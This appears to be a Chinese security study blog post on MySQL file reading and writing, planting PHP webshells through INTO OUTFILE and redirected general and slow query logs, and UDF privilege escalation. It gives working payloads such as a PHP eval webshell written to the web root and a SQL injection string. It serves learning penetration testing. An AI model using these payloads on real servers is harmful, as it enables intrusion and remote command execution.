---
title: MySQL 读写文件与 getshell
date: 2026-11-10
---

# MySQL 读写文件与 getshell

## 前言

前段时间疯狂地推进 Java，这段时间准备好好沉淀一下，顺便复习一下之前学习的内容，然后深入一点。

## 读写文件

### 权限与配置

MySQL 中想要直接读写服务器主机文件一般需要`FILE`权限，并且会受到`secure_file_priv`这个系统变量的限制。

`FILE`权限是 MySQL 的一个全局管理权限，它允许拥有该权限的用户，以 **MySQL 服务进程**的身份去读取或者写入服务器主机上的文件。这个权限非常敏感，因为它把数据库的操作边界扩展到了操作系统的层面。

- **任意文件读取：**拥有`FILE`权限的用户，可以读取到 MySQL 服务进程有权限访问的任何文件（比如`/etc/passwd`），并将其内容导入到数据库表中，再查询出来。
- **任意文件写入：**该权限允许用户将查询结果写入服务器文件系统。如果 MySQL 以高权限用户（如 root）运行，攻击者可以利用它写入恶意文件（如计划任务、配置文件），从而提权。

> 如何设置 FILE 权限

`FILE`权限是全局权限，作用域必须是`*.*`，不能指定到那个数据库或表。操作需要由拥有`GRANT`权限的管理员账号来执行。

**授予权限：**

使用`GRANT`语句给指定用户授权：

```sql
GRANT FILE ON *.* TO 'username'@'host';
```

执行之后通常运行`FLUSH PRIVILEGES;`来让权限立即生效。

**验证权限：**

最可靠的方式是使用`SHOW GRANTS`命令：

```sql
SHOW GRANTS FOR 'username'@'host';
```

如果结果中出现 `GRANT FILE ON *.* TO ...`，说明权限已生效。

**回收权限：**

```sql
REVOKE FILE ON *.* FROM 'username'@'host';
```

同样，回收后需验证。我们可以用该用户身份尝试执行 `SELECT ... INTO OUTFILE`，预期会收到“Access denied”错误。

但是仅仅拥有`FILE`权限并不能保证文件操作一定能成功，它实际能读写的路径还受到`secure_file_priv`这个系统变量的严格限制。

- 如果`secure_file_priv`被设置为一个**具体目录**（如`/var/lib`），那么`FILE`权限的文件操作就只能在这个目录中进行。
- 如果`secure_file_priv`被设置为`NULL`，则会**完全禁用**文件的导出导入功能，此时即使有`FILE`权限也没用。
- 如果`secure_file_priv`被设置为**空字符串("")**，则没有路径限制。

### 语句

**`SELECT ... INTO OUTFILE`：将查询结果导出到文件**

这是最常用的导出语句，可以将表数据写入到服务器主机上的文本文件。

```sql
SELECT * FROM your_table
INTO OUTFILE '/path/to/file.csv'
FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"'
LINES TERMINATED BY '\n';
```

这个文件是由 **MySQL 服务器**创建，因此路径必须是服务器上有写权限的目录，且目标文件**不能已存在**。

**`SELECT ... INTO DUMPFILE`：写入单行且无格式**

这个语句和`OUTFILE`类似，但是它只写入一行数据，且不进行任何字段或行转义处理，适合写入二进制或单行大文本。

**`LOAD DATA INFILE`：将文件数据导入表中**

这是`SELECT ... INTO OUTFILE`的逆向操作，用于批量导入文本数据。

```sql
LOAD DATA INFILE '/path/to/file.csv'
INTO TABLE your_table
FIELDS TERMINATED BY ',' ENCLOSED BY '"'
LINES TERMINATED BY '\n';
```

**`LOAD_FILE()`：将整个文件内容作为字符串读取**

这是一个函数，返回文件内容，通常用于读取配置文件或者小文本。

```sql
SELECT LOAD_FILE('/path/to/file.txt');
```

文件必须在服务器主机上，大小不能超过`max_allowed_packet`，而且必须位于`secure_file_priv`指定的目录中。

## 植入 webshell

MySQL 植入 Webshell 主要有两种方式：

1. `into outfile`直接写入文件
2. 日志文件写入

至于怎么选，完全取决于`secure_file_priv`这个关键配置的状态。

### `into outfile`直接写入

这是最直接也最容易想到的方法，但是前提条件比较苛刻。

**核心语句**：`SELECT ... INTO OUTFILE`。

**利用条件：**

1. **高权限**：当前数据库用户拥有`FILE`权限。
2. **知道绝对路径：**必须清楚网站根目录在服务器上的物理路径。
3. **`secure_file_priv` 允许：**查询`show variables like '%secure_file_priv%';`，其值**不能**为`NULL`。如果为空字符串（`''`），则不限目录；如果是一个具体的目录，则只能写入该目录。
4. **目录可写：**MySQL 进程对目标 Web 目录有写入权限

payload 示例：

```sql
SELECT '<?php @eval($_POST["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php';
```

注入的时候可以使用联合查询注入。当`union`无法使用时，可以使用`FIELDS TERMINATED BY`、`LINES TERMINATED BY`、`LINES STARTING BY`等语句绕过。通过**指定字段之间的分隔符**来注入 webshell。

例如：

```sql
?id=1 INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php @eval($_POST["cmd"]);?>'#
```

### 日志文件写入

当`into outfile`因为`secure_file_priv=NULL`而失效时，这是最常用的替代方案。

**核心原理：**MySQL 的通用查询日志（`general_log`）会记录执行的每一条 SQL 语句。如果能将日志文件路径指向 Web 目录下的一个 php 文件，那么执行一条包含 webshell 代码的查询，该代码就会被记录并解析执行。

**关键变量：**

- `general_log`：日志开关。
- `general_log_file`：日志文件保存路径。

利用步骤：

**1. 查看当前配置**

```sql
SHOW VARIABLES LIKE '%general%';
```

**2. 开启日志并修改路径**

```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
```

**3. 执行包含 payload 的查询**（语句本身会被写入到日志文件中）

```sql
SELECT '<?php @eval($_POST["cmd"]);?>';
```

### 慢查询日志

如果说`general_log`被禁用或者受限，我们也可以尝试使用慢查询日志`slow_query_log`来利用。原理和日志文件写入类似，但是需要构造一条执行时间超过`long_query_time`（默认 10 秒）的语句，让包含 payload 的查询被记录到指定的慢查询日志文件中。

**核心思路：**利用 MySQL 记录“执行时间过长的 SQL 语句”这一机制，把包含恶意代码的查询语句，原样抄写到 Web目录下的一个 php 文件中。而且日志文件的写入路径`slow_query_log_file`在很多 MySQL 版本上**不受`secure_file_priv`的约束**。

**利用步骤**

整个过程需要数据库账号具备`SUPER`或`SYSTEM_VARIABLES_ADMIN`权限（比如`root`用户）来修改全局变量，并且已知网站根目录的绝对路径。

**1. 确认慢查询日志的状态**

先查看当前日志是否开启、文件路径以及“慢”的判定时间。

```sql
SHOW VARIABLES LIKE '%slow_query_log%';
SHOW VARIABLES LIKE '%long_query_time%';
```

`long_query_time` 默认通常是 10 秒。只有执行时间超过这个值的 SQL 语句，才会被记录。

**2. 开启日志并指向 Web 目录**

把日志文件的路径修改为一个 Web 可访问的 php 文件。

```sql
SET GLOBAL slow_query_log = 1;
SET GLOBAL slow_query_log_file = '/var/www/html/shell.php';
```

执行之后，MySQL 可能会立即创建这个空文件。

**3. 写入包含 payload 的慢查询**

这里需要构造一条查询，让它**即包含 webshell 代码，又因为执行时间超过阈值而被记录。**

```sql
SELECT '<?php @eval($_POST["cmd"]);?>' OR SLEEP(11);
```

这条语句会先计算 `SELECT '...'` 的结果，然后因为 `OR SLEEP(11)` 的存在，整个查询会延迟至少 11 秒。一旦执行时间超过 `long_query_time`，MySQL 就会把这条完整的 SQL 语句（包括里面的 PHP 代码）写入到 `shell.php` 中。

## UDF 提权

### 原理

UDF 指用户自定义函数，用户可以对数据库所使用的函数进行一个扩展（利用 dll 文件），从而定制一些符合自己需求的函数。而 UDF 提权，本质上是攻击者滥用 MySQL 的“用户自定义函数”功能，将数据库权限跨越到操作系统权限。它的核心逻辑是：让 MySQL 加载一个恶意的共享库（Linux 下是`.so`，win 下是`.dll`），然后通过 SQL 语句调用这个库里包含的系统命令执行函数，从而以 **MySQL 服务进程的系统身份**（通常是高权限用户）来执行任意命令。

### 关键前提

UDF 能提权成功，通常需要同时满足几个苛刻的条件：

- **拥有数据库高权限：**攻击者需要拥有一个具有`FILE`权限和`CREATE FUNCTION`权限（用于注册函数）的 MySQL 账号，通常是`root`账号。
- **MySQL 进程权限未降级**：这是提权的收益来源。如果 MySQL 服务是以`root`或`system`权限运行的，那么通过 UDF 执行的命令也就继承了这些高权限。如果 MySQL 是以低权限的`mysql`用户运行，提权效果就会很一般。
- **可控的文件写入路径：**攻击者需要能将恶意的`.so`或`.dll`文件写入 MySQL 的插件目录（`plugin_dir`）。这通常需要通过`SELECT ... INTO DUMPFILE`语句实现，而该语句受`secure_file_priv`变量的严格限制。

### 攻击步骤

1. **编写恶意库：**攻击者编写一个 C 程序，其中包含`sys_eval`或者`sys_exec`等函数，然后编译成共享库文件。
2. **上传至插件目录：**利用`SELECT ... INTO DUMPFILE`等语句，将编译好的库文件写入 MySQL 的插件目录。对于 MySQL 5.1 及以上的版本，这个目录通常是`lib/plugin`。
3. **注册自定义函数：**通过`CREATE FUNCTION sys_eval RETURNS STRING SONAME '恶意库文件名.so';`这个名告诉 MySQL 从指定的库文件中加载`sys_eval`这个函数。
4. **执行系统命令**：注册成功后，攻击者就可以在 SQL 中直接调用，例如`SELECT sys_eval('whoami');`，命令就会以 MySQL 进程的身份被执行。











































